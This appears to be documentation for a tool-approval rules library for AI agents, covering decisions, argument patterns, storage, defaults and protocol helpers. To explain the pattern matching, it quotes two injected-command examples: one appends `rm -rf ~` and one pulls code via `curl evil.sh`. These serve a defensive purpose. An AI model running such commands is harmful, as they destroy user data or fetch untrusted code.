Approval rules: what a person decided once, applied to the calls that follow. A decision is `allow-once`, `allow-session`, `allow-always`, `deny-once` or `deny-always`. A session or always decision leaves a rule over the tool (`tool`, a name or a glob such as `mcp_github_*`), narrowed by argument patterns when given (`args: { command: 'npm test*' }`, with dotted names for nested arguments) or by a test of your own (`when`). When an allow rule and a deny rule both match a call, the deny rule wins.

**The patterns.** A pattern matches the whole argument. `*` matches any run of characters except shell operators: `;`, `&`, `|`, `` ` ``, `<`, `>`, `$(` and line breaks. So `npm test*` allows `npm test -- --watch`, but not `npm test && rm -rf ~` or `npm test $(curl evil.sh)`. `**` matches anything, operators included. `?` matches one character, and `\` makes the next one literal. Numbers and booleans match as text. Arrays, objects and missing arguments match no pattern.

**What it does.** `decide(request, decision, { reason, input, args })` records a person's decision, and the rule it leaves. `answer(request)` answers from the rules when one covers the call, recorded as decided by that rule. `match`, `addRule`, `removeRule` and `clearSession` work on the rules directly. `onAudit` receives every decision, with who made it (a person or a rule), the rule, the reason and any edited arguments, as well as every rule added or removed and every session cleared.

**Where rules are kept.** Session rules stay in memory until the page reloads or `clearSession()` runs. `always` rules go to `storage`: by default in memory, `webStorageRules()` for `localStorage`, or your own `{ load, save }`, which may be async. A rule's `when` is code, and is never saved. Rules are loaded after the first render, so a server render and the hydrating client agree. A call that arrives before they load is shown to a person.

**Default rules.** `defaultRules` are the rules a person starts with, such as allowing reads. On a first visit, with nothing saved, they are the rules. An `always` default the person removes stays removed on later visits, and a default your app adds in a later version still appears. `webStorageRules()` keeps the removed ids under `<key>:removed-defaults`. A storage of your own keeps them with the optional `loadRemovedDefaults()` and `saveRemovedDefaults(ids)`; without these, a removed default comes back on the next load. Adding a rule with a removed default's id, as a "Reset" button would, brings it back. A `session` default is a session rule: it comes back with each page load.

**On the server.** The same rules, as AI SDK 7's `toolApproval`: `streamText({ toolApproval: toToolApproval(rules) })` approves or denies a call a rule covers, and asks a person about the rest. The SDK checks it again on an approved call before running it, with edited arguments too. Rules a client sends are the choices of the person using it, so apply them to that person's runs only. Keep rules that protect other people on the server.

**AG-UI and ACP.** With `useAgUiAgent`, an approval's resume payload is `{ approved, reason?, input? }`. For the Agent Client Protocol's `session/request_permission`:

- `decisionsFromAcpOptions(request.options)` gives the choices to offer.
- `toAcpPermissionResponse(decision, request.options)` answers with the option of the same kind (`allow_once`, `allow_always`, `reject_once`, `reject_always`).
- `fromAcpPermissionRequest(request)` turns the request into the card's.

ACP has no session option, so `allow-session` answers `allow_once` and leaves the session rule on the client. These helpers are types and functions only, with no ACP package to install.
